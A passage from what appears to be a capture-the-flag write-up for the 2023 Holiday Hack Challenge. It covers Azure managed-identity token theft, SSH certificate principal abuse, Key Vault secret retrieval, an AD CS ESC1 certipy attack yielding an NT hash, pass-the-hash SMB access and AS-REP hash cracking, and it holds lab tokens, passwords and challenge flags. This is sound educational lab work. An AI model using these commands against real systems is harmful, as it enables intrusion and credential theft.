curl -X GET   "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01" -H "Authorization: Bearer $result"tted to JSON
```

```bash
{
  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web",
  "name": "northpole-ssh-certs-fa",
  "type": "Microsoft.Web/sites/sourcecontrols",
  "location": "East US",
  "tags": {
    "project": "northpole-ssh-certs",
    "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl"
  },
  "properties": {
    "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
    "branch": "main",
    "isManualIntegration": false,
    "isGitHubAction": true,
    "deploymentRollbackEnabled": false,
    "isMercurial": false,
    "provisioningState": "Succeeded",
    "gitHubActionConfiguration": {
      "codeConfiguration": null,
      "containerConfiguration": null,
      "isLinux": true,
      "generateWorkflowFile": true,
      "workflowSettings": {
        "appType": "functionapp",
        "publishType": "code",
        "os": "linux",
        "variables": {
          "runtimeVersion": "3.11"
        },
        "runtimeStack": "python",
        "workflowApiVersion": "2020-12-01",
        "useCanaryFusionServer": false,
        "authType": "publishprofile"
      }
    }
  }
}
```

What other users are on this server other than monitor?

```bash
monitor@ssh-server-vm:/home$ ls
alabaster  monitor
```

What principle has access to the user alabaster?

```bash
monitor@ssh-server-vm:/etc/ssh$ cd auth_principals/
monitor@ssh-server-vm:/etc/ssh/auth_principals$ ls
alabaster  monitor
monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster 
admin
monitor@ssh-server-vm:/etc/ssh/auth_principals$ 
```

Create keys for the admin principal

```bash
 ssh-keygen -t rsa -C "admin@ssh-server-vm.santaworkshopgeeseislands.org"
```

After looking at Github code, it appears if you specify the principal it will use that principal value, otherwise it defaults to the OS environment variable DEFAULT_PRINCIPAL which must be elf. Create certificate for admin via CURL and specify the principal 

```bash
curl -X POST  https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl  -H "Content-Type: application/json"  -d '{"ssh_pub_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0+n6OAfimJ6D0CL3Oa7D3J+qJhYtz2RgBnE6pqNgsa/SmrDGnRYzu47LKCS2gCS+Do4ND8wK49GmSoxq4M+YRRDIqtVqSql7xEXbol7vSN8bTM2bAOMrjhz9RU4i9QzrwxafRoLMfDShbhyBaUjeT+GKmnI4072VNdqHGVbimUXCj+chMMrP+nA3doAalajyrG8YQfv76PqruwEBXxE8n0GJoWFnP3QQBzHQGMInaE4d8x+IJG/8f4S5XTnQY0giBm9aAQ1CJcXWbwuEKS4HJH/GPEQu6WB0xSegUejJujoYnSIN6/kBqHdEi0wRpVmrN67T6DwrPAxT6jgNTPOP4U2c61QapkRpGXLR1usr8WF1UZ8gAjGJgGsyYQ3nb3fqmh8ARLQZE9DNyZXEjUSKhOf3SOzDlOEzKdMkzvXSzL/Cj2Qsj7CCEuRpf7dRQXJ3k0GJdvd7OGDjs6bOfdK4ewevaCQpj3WgV633jI7xFEOALuF+FZrb1vwwyyHi6IF0= admin@ssh-server-vm.santaworkshopgeeseislands.org", "principal": "admin"}'
```

Create a public cert file to hold the value, in my case admin.pub

```
echo "rsa-sha2-512-cert-v01@openssh.com AAAAIXJzYS1zaGEyLTUxMi1jZXJ0LXYwMUBvcGVuc3NoLmNvbQAAACcxOTk2OTc4MjM2MjI3NzUwMjczODE1NTgwNzQxMTI5OTI2ODYwODIAAAADAQABAAABgQC0+n6OAfimJ6D0CL3Oa7D3J+qJhYtz2RgBnE6pqNgsa/SmrDGnRYzu47LKCS2gCS+Do4ND8wK49GmSoxq4M+YRRDIqtVqSql7xEXbol7vSN8bTM2bAOMrjhz9RU4i9QzrwxafRoLMfDShbhyBaUjeT+GKmnI4072VNdqHGVbimUXCj+chMMrP+nA3doAalajyrG8YQfv76PqruwEBXxE8n0GJoWFnP3QQBzHQGMInaE4d8x+IJG/8f4S5XTnQY0giBm9aAQ1CJcXWbwuEKS4HJH/GPEQu6WB0xSegUejJujoYnSIN6/kBqHdEi0wRpVmrN67T6DwrPAxT6jgNTPOP4U2c61QapkRpGXLR1usr8WF1UZ8gAjGJgGsyYQ3nb3fqmh8ARLQZE9DNyZXEjUSKhOf3SOzDlOEzKdMkzvXSzL/Cj2Qsj7CCEuRpf7dRQXJ3k0GJdvd7OGDjs6bOfdK4ewevaCQpj3WgV633jI7xFEOALuF+FZrb1vwwyyHi6IF0AAAAAAAAAAQAAAAEAAAAkZDk2Zjg1YTctMWJlMS00ZTRlLWFhNzktMzNhNGVlMmIzOWQ2AAAACQAAAAVhZG1pbgAAAABleNnaAAAAAGWdxQYAAAAAAAAAEgAAAApwZXJtaXQtcHR5AAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGk2GNMCmJkXPJHHRQH9+TM4CRrsq/7BL0wp+P6rCIWHAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEDbnp12sOwrKKtyDh8G5M9mPpoNemlrgoxqXvOo00pzxHgqXVue9MC1xUIpbYSTXwWg9ucK8nMilkJbY5HpjYwH" > admin.pub  
```

Login as Alabaster

```bash
ssh -i admin.pub alabaster@ssh-server-vm.santaworkshopgeeseislands.org -i id_rsa
Last login: Tue Dec 12 22:17:15 2023 from 206.83.30.183
alabaster@ssh-server-vm:~$
```

Let's check out his TODO list :) 

```bash
alabaster@ssh-server-vm:~$ cat alabaster_todo.md 
# Geese Islands IT & Security Todo List

- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
```

Insert 

```
Gingerbread
```

into your badge for GLORY!

---

## Objective: Active Directory

Generate access token for the vault [Get Secret - Get Secret - REST API (Azure Key Vault) | Microsoft Learn](https://learn.microsoft.com/en-us/rest/api/keyvault/secrets/get-secret/get-secret?view=rest-keyvault-secrets-7.4&tabs=HTTP)

```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
```

Output

```bash
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0MjAwNjUsIm5iZiI6MTcwMjQyMDA2NSwiZXhwIjoxNzAyNTA2NzY1LCJhaW8iOiJFMlZnWU9EMjZpcjVzZTVYYmNlYW5xWmpjLy9mQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoic0hGUFkwa0VIVVdwQ2Y1cms2TjNBQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.PgMpcAu0q7PlrkjMRRoSab8CWzl3hKr8_LO25lgekxKRZWyd5gjXWl3KTBXdRra5NQH7SmDJCFQBH1mm00q3hrA1LQn-KKGtFr3BsCBlfZkFwYsetzBR-lLft3TjDVQQWTC4nlivsO0WBlnPXt3CVJXJCElboPievCkKb8ATRJcVY2wZAr-eBEoIXWxW60UCSiTTTHaoGbMmC7cO88xUQHGi8m8gRXfz7dHmw3ji8CdUYrIcqBZQmZFqR_pR38pCZbikmx77JrsCgg-VE3bCfJwyAJtbnSc_OV3XopcrFoIfxAaIqtxkV8dBH4mh4rAGu-LqjZ4BkQ29XxDbgdoI_g","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"84871","expires_on":"1702506765","ext_expires_in":"86399","not_before":"1702420065","resource":"https://vault.azure.net","token_type":"Bearer"}
```

Store token in $accesskey

```bash
accesskey="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0MjAwNjUsIm5iZiI6MTcwMjQyMDA2NSwiZXhwIjoxNzAyNTA2NzY1LCJhaW8iOiJFMlZnWU9EMjZpcjVzZTVYYmNlYW5xWmpjLy9mQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoic0hGUFkwa0VIVVdwQ2Y1cms2TjNBQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.PgMpcAu0q7PlrkjMRRoSab8CWzl3hKr8_LO25lgekxKRZWyd5gjXWl3KTBXdRra5NQH7SmDJCFQBH1mm00q3hrA1LQn-KKGtFr3BsCBlfZkFwYsetzBR-lLft3TjDVQQWTC4nlivsO0WBlnPXt3CVJXJCElboPievCkKb8ATRJcVY2wZAr-eBEoIXWxW60UCSiTTTHaoGbMmC7cO88xUQHGi8m8gRXfz7dHmw3ji8CdUYrIcqBZQmZFqR_pR38pCZbikmx77JrsCgg-VE3bCfJwyAJtbnSc_OV3XopcrFoIfxAaIqtxkV8dBH4mh4rAGu-LqjZ4BkQ29XxDbgdoI_g"
```

Let's find our vault using the $result token from earlier

```bash
curl -X GET   "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?$filter=resourceType&api-version=2015-11-01"   -H "Authorization: Bearer $result"
```

Output formatted in JSON

```json
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    }
  ]
}
```

Access secrets in the vault

```bash
curl -s "https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $accesskey"
```

Output

```json
{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}
```

Let's take a peek at that file

```bash
curl -s "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4" -H "Authorization: Bearer $accesskey"
```

Output 

```json
{
  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
  "attributes": {
    "enabled": true,
    "created": 1699564823,
    "updated": 1699564823,
    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}
```

Storing the password for elfy in a variable to make it easier

```bash
password='J4`ufC49/J4766'
```

Let's see what other users we can identify in AD

```bash
./GetADUsers.py  -all northpole.local/elfy:$password -dc-ip 10.0.0.53
```

Output

```
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
alabaster                                             2023-12-12 02:03:10.009431  2023-12-12 21:26:35.106729 
Guest                                                 <never>              <never>             
krbtgt                                                2023-12-12 02:11:42.348154  <never>             
elfy                                                  2023-12-12 02:13:45.650140  2023-12-12 21:18:50.936250 
wombleycube                                           2023-12-12 02:13:45.759558  2023-12-12 23:21:41.208709 
```

Let's enumerate certificate templates

```
certipy find -u elfy@northpole.local -p $password -dc-ip 10.0.0.53
```

Let's see if any templates allow an unprivileged user to enroll

```bash
cat 20231212232257_Certipy.json | grep "Users"
```

Output

```bash
         "NORTHPOLE.LOCAL\\Authenticated Users"
      "Template Name": "NorthPoleUsers",
      "Display Name": "NorthPoleUsers",
            "NORTHPOLE.LOCAL\\Domain Users",
        "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
            "NORTHPOLE.LOCAL\\Domain Users",
            "NORTHPOLE.LOCAL\\Domain Users",
            "NORTHPOLE.LOCAL\\Domain Users",
            "NORTHPOLE.LOCAL\\Domain Users",
```

Let's generate a cert and priv key for wombleycube

```bash
certipy req -u 'elfy@northpole.local' -p $password -dc-ip 10.0.0.53 -target 'npdc01.northpole.local' -ca 'northpole-npdc01-CA' -template 'NorthPoleUsers' -upn 'wombleycube@northpole.local'
```

Output

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 148
[*] Got certificate with UPN 'wombleycube@northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube.pfx'
```

Let's try to auth with our new cert

```bash
certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53
```

Output

```bash
*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
```

Let's enumerate computers to find our potential file share

```bash
net.py elfy:$password@10.0.0.53 computer
```

Output

```
[*] Enumerating computers ..
  1. npdc01$
```

 Let's connect to the domain controller with smbclient, it's the only computer in this domain so must be our fileshare

```bash
smbclient.py wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
```

Hmm.. this looks suspicious, let's save the contents for later.

```
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# use FileShare
# ls
drw-rw-rw-          0  Tue Dec 12 02:14:08 2023 .
drw-rw-rw-          0  Tue Dec 12 02:14:05 2023 ..
-rw-rw-rw-     701028  Tue Dec 12 02:14:08 2023 Cookies.pdf
-rw-rw-rw-    1521650  Tue Dec 12 02:14:08 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Tue Dec 12 02:14:08 2023 SignatureCookies.pdf
drw-rw-rw-          0  Tue Dec 12 02:14:08 2023 super_secret_research
-rw-rw-rw-        165  Tue Dec 12 02:14:08 2023 todo.txt
```

Enter

```
InstructionsForEnteringSatelliteGroundStation.txt
```

into your badge to achieve GLORY!

---

## Objective: Faster Lock Combination

When applying tension to the shackle and turning the dial clockwise, the number that the lock repeatedly hangs on is the sticky number. 

Sticky Number: 20

When applying heavy tension to the shackle and turning the lock counter clockwise, the numbers we are looking for will sit between two half numbers and will be between 0-11

Guess Number 1: 0

Guess Number 2: 3

First Digit: Sticky Number + 5 = ***25***

Third Digit: 13  OR 33, 13 feels more loose when applying tension to the shackle so we can eliminate 33 as an option

Third Digit Process: 

First Digit/4 = 6 with remainder of 1

Guess Numbers: 0 & 3

0    10    20   30

3    13    23    33

13/4 = 4 with remainder of 1 & 33/4 = 8 with remainder of 1

Second Digit Process:

First Row Below: Remainder + 2  = 3

Add 8 to it 4 times, exceeding 39 resets to 0

Second Row Below: remainder + 2 + 4 = 7

Add 8 to it 4 times, exceeding 39 resets to 0

3    ~~11~~    19    27    35

7    ~~15~~     23    31    39

The second and third digit on the lock cannot be within 2 digits of eachother, we can eliminate 15 & 17 from our second digit guesses. 

After trying the 8 options, our true combination is: 25, 39, 13!

If you want to "hack" the challenge instead, you can look at the javascript variables in the iframe to reveal the combination for your session. The variable that holds the combination is: lock_numbers

![](/docs/assets/images/lock.png)

You can also edit the lock combination that the game is looking for if you'd like. This just makes it faster to solve the combo :D

![](/docs/assets/images/editlock.png)

---

## Objective: Phish Detection Agency

Valid SPF: 

| Domain           | Type | Value                               |
| ---------------- | ---- | ----------------------------------- |
| geeseislands.com | TXT  | v=spf1 a:mail.geeseislands.com -all |

Valid DKIM:

| Domain           | Type | Value                                                                                                                                                                                                                                  |
| ---------------- | ---- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| geeseislands.com | TXT  | v=DKIM1;t=s;p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDjtqsLqwecFGF7AmP+Siln86O1v9NOKJw4ZsEHDV5fo0Vjj0qNPyyARKSkDmnIKjnzLGUUQO31Fr+vdZU61IaI9/ZD39WJKaAeX96uQ65mRQqqPVYxPLN5OvuFRmIHJ/TgOkD6z5/7VM7Zs1kw5Qnl04FmOLwWd00D+uNZnj8TCwIDAQAB |

Valid DMARC:

| Domain           | Type | Value                                                                  |
| ---------------- | ---- | ---------------------------------------------------------------------- |
| geeseislands.com | TXT  | v=DMARC1; p=reject; pct=100; rua=mailto:dmarc-reports@geeseislands.com |

In this challenge we had to weed through all the emails in the Inbox along with those that were already in the Phishing folder to determine if ChatNPT properly assessed the emails. The key piecees to look at in the email headers displayed was:

Return-Path - if the return path was not for emailaddress@geeseislands.com the email should be marked as malicious, as all mail is expected to be from that domain in this challenge

DMARC - if this value is set to "Fail", you can assume phishing in this challenge

DKIM-Signature - if the domain value (d=) in the signature is not geeseislands.com, you can assume it is a phishing email OR if this is just showing "Invalid"

Recieved - If the received field is from a different domain than the expected sender of geeseislands.com, you can assume it is a phishing email

Phish email example 1:

![](/docs/assets/images/phish1.png)

Phish email example 2:

![](/docs/assets/images/phish2.png)

Valid email example 1:

![](/docs/assets/images/valid1.png)

GLORY:

![](/docs/assets/images/acedetect.png)

---

## Objective: Na'an

If you cover both the numerical low (0) and high (9) and use NaN as one of the options, the other numbers you place do not matter. The evaluation will fail in your favor. As long as you cover the extremes, NaN will be seen as winner for both min and max due to the python evaluation error. 

GLORY:

![](/docs/assets/images/nan.png)

---

## Operation: Kusto Detective

Onboarding: How many craftperson elves are using laptops?

![](/docs/assets/images/kd1.png)

Answer: *25*

Case 1: Welcome to Operation Giftwrap: Defending the Geese Island network

Question 1: What is the email address of the employee who received this phishing email?

![](/docs/assets/images/kd2.png)

Answer: 

```
alabaster_snowball@santaworkshopgeeseislands.org
```

Question 2: What is the email address that was used to send this spear phishing email?

![](/docs/assets/images/kd3.png)

Answer: 

```
 cwombley@gmail.com
```

Question 3: What was the subject line used in the spear phishing email?

![](/docs/assets/images/kd4.png)

Answer: 

```
[EXTERNAL] Invoice foir reindeer food past due
```

Case 2: Someone got phished! Let's dig deeper on the victim...

Question 1: What is the role of our victim in the organization?

![](/docs/assets/images/kd5.png)

Answer: 

```
Head Elf
```

Question 2: What is the hostname of the victim's machine?

![](/docs/assets/images/kd6.png)

Answer: 

```
Y1US-DESKTOP
```

Question 3: What is the source IP linked to the victim?

![](/docs/assets/images/kd7.png)

Answer: 

```
10.10.0.4
```

Case 3: That's not good. What happened next?

Question 1: What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!

![](/docs/assets/images/kd8.png)

Answer: 

```
2023-12-02T10:12:42Z
```

Question 2: What file is dropped to Alabaster's machine shortly after he downloads the malicious file?

![](/docs/assets/images/kd9.png)

Answer: 

```
giftwrap.exe
```

Case 4: A compromised host! Time for a deep dive.

Question 1: The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?

![](/docs/assets/images/kd10.png)

Answer: 

```
113.37.9.17
```

Question 2: What is the timestamp when the attackers enumerated network shares on the machine?

![](/docs/assets/images/kd11.png)

Answer: 

```
2023-12-02 16:51:44.0000000
```

Question 3: What was the hostname of the system the attacker moved laterally to?

![](/docs/assets/images/kd12.png)

Answer: 

```
NorthPolefileshare
```

Case 5: A hidden message

Question 1: When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?

![](/docs/assets/images/kd13.png)

Answer: 

```
2023-12-24 16:07:47.0000000
```

Question 2: What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)

We can check out the first encoded powershell command after the attacker accessed the fileshare.

![](/docs/assets/images/kd14.png)

After base64 decoding, we can see that this is also reversed. We can use the reverse() command to assist here and reveal the answer.

![](/docs/assets/images/kd15.png)

Answer: 

```
NaughtyNiceList.txt
```

Question 3: The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?

We can review the next powershell command after the file was copied. 

![](/docs/assets/images/kd16.png)

After base64 decoding, we can see that this command is also encoded in decimal. We need to convert this to ASCII for it to be easily legible.

![](/docs/assets/images/kd17.png)

I used: [charcode encoder-decoder](https://codepen.io/HerbertAnchovy/pen/XLzdYr) to decode the char decimal into ASCII, which revealed our answer.

![](/docs/assets/images/kd18.png)

Answer: 

```
giftbox.com
```

Case 6: The final step!

Question 1: What is the name of the executable the attackers used in the final malicious command?

![](/docs/assets/images/kd20.png)

Answer: 

```
downwithsanta.exe
```

Question 2: What was the command line flag used alongside this executable?

We can use the same decoded powershell to find the answer for this question.

![](/docs/assets/images/kd20.png)

Answer: 

```
--wipeall
```

HHC23 Badge Answer

After completing all the cases, you are presented with one final encoded command: 

```javascript
print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')
```

![](/docs/assets/images/kd21.png)

We can put 

```javascript
Beware the Cube that Wombles
```

into our badge on HHC23 to achieve GLORY!

---

## Objective: Game Cartridges: Vol 1

For this game, the goal is to move pixels of the QR code back to their correct place. There are 7 pixels out of place. As you send music notes through misplaced pixels they'll flash, make music, and a flashing square will appear where it shoud go. You simply push your character against the block to move it, you cannot pull a block or push.

Known controls:

- arrows keys to move around

- (e) = a on the gameboy

- (r) = b on the gameboy, for this game it shoots out the music notes

If you look in the js/script.js file, you can find some additional controls that are unlisted.

```javascript
  bindKeys() {
    this.keyFuncs = {
      Backspace: this.keyRewind.bind(this),
      " ": this.keyPause.bind(this),
      "[": this.keyPrevPalette.bind(this),
      "]": this.keyNextPalette.bind(this),
    };
```

In the order shown, these allow you to:

- Rewind the game, if you push a block to the wrong place simply hold Backspace and it will rewind time!

- "Space", if you push spacebar it will pause the game

- Return to the previous color palette for the game

- Proceed to the next color palette for the game

Once all pixels are in their correct location (Be careful with the last one! You need to travel some distance to get it to its proper home!) the game will reveal the full QR code. 

![](/docs/assets/images/gcv1.png)

This QR code is linked to 

```javascript
8bitelf.com
```

Visiting the website reveals the flag to plug into your badge. To achieve glory enter the below into your bade

```javascript
santaconfusedgivingplanetsqrcode
```

---

## Objective: Hashcat

Instructions:

```
In a realm of bytes and digital cheer,  
The festive season brings a challenge near.  
Santa's code has twists that may enthrall,  
It's up to you to decode them all.

Hidden deep in the snow is a kerberos token,  
Its type and form, in whispers, spoken.  
From reindeers' leaps to the elfish toast,  
Might the secret be in an ASREP roast?

`hashcat`, your reindeer, so spry and true,  
Will leap through hashes, bringing answers to you.  
But heed this advice to temper your pace,  
`-w 1 -u 1 --kernel-accel 1 --kernel-loops 1`, just in case.

For within this quest, speed isn't the key,  
Patience and thought will set the answers free.  
So include these flags, let your command be slow,  
And watch as the right solutions begin to show.

For hints on the hash, when you feel quite adrift,  
This festive link, your spirits, will lift:  
https://hashcat.net/wiki/doku.php?id=example_hashes

And when in doubt of `hashcat`'s might,  
The CLI docs will guide you right:  
https://hashcat.net/wiki/doku.php?id=hashcat

Once you've cracked it, with joy and glee so raw,  
Run /bin/runtoanswer, without a flaw.  
Submit the password for Alabaster Snowball,  
Only then can you claim the prize, the best of all.

So light up your terminal, with commands so grand,  
Crack the code, with `hashcat` in hand!  
Merry Cracking to each, by the pixelated moon's light,  
May your hashes be merry, and your codes so right!

* Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to /bin/runtoanswer .*
```

Hash.txt contents:

```bash
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966
```

Grep through the hashcat manual to find the proper hashmode for the hash at hand

```bash
elf@d2bdc40ea53d:~$ hashcat --help | grep -i "kerberos"
   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
```

We can use our handy poem to determine we need mode to handle *ASREP* or we can leverage the output of the hash.txt file to see we need a mode that can handle Kerberos 5 ASREP, aka 18200.

Hashcat command:

```bash
